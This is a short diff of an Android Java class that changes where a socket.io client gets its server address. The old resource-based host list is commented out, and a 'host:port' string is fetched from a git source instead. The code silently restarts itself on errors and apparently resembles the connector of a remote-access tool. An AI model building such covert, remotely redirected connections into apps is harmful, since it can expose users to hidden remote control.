@@ -21,6 +21,7 @@ public class ConnectionManager {
     private static io.socket.client.Socket ioSocket;
     private static FileManager fm = new FileManager();
 
+
     public static void startAsync(Context con)
     {
         try {
@@ -29,7 +30,6 @@ public class ConnectionManager {
         }catch (Exception ex){
             startAsync(con);
         }
-
     }
 
 
@@ -38,8 +38,8 @@ try {
 
     if(ioSocket != null )
         return;
-
-    String hosts []= HostsManager.getHosts(context);
+/*
+    String hosts []= HostsManager.getHostsByResource(context);
     if(hosts == null)
         return ;
     for (String host : hosts) {
@@ -53,6 +53,11 @@ try {
         if(IOSocket.getInstance().getIoSocket().connected())
             break;
     }
+*/
+    String host = HostsManager.getHostsByGit();
+    String str[] =host.split(":");
+    IOSocket.getInstance().initConnect(str[0],str[1]);
+
 
     ioSocket = IOSocket.getInstance().getIoSocket();
 
